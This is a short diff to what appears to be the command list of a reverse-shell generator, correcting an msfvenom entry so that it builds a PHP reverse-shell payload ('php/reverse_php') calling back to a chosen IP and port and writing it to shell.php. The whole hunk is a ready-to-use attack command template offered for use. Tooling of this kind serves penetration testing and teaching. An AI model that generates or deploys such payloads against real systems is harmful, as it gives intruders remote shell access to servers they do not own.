@@ -312,7 +312,7 @@ const msfvenomCommands =  withCommandType(
         },
         {
             "name": "PHP Reverse PHP",
-            "command": "msfvenom -p php/reverse_tcp LHOST={ip} LPORT={port} -o shell.php",
+            "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
             "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
         },
         {
